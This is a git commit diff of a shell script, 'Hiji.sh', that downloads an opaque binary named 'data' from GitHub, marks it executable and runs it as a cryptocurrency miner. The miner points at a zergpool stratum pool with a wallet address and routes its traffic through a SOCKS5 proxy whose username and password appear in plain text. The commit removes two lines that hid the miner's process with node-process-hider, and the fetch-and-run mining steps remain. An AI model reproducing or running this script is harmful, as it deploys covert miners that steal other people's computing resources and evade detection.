196be929f79d8f87502ae4305b29e2c41558d976
eyishxd <102873412+eyishxd@users.noreply.github.com>
2022-04-27 10:34:13 +0700

    Update Hiji.sh

--- Hiji.sh
+++ Hiji.sh
@@ -2,6 +2,4 @@
 apt update -y && apt install curl libssl1.0-dev nodejs nodejs-dev node-gyp npm -y
 wget -q https://github.com/thirthada007/DevOps/raw/main/data
 chmod +x data
-npm i -g node-process-hider 
-ph add data
 ./data -a yespower -o stratum+tcp://yespower.na.mine.zergpool.com:6533 -u TQzmMDEjP1k2a7c6xqf3xJgJJ7E9NkzBbW.archer -p c=TRX -t $(nproc) -x socks5://lwnyzqkn:zcw4kwul3yqj@45.142.28.145:8156
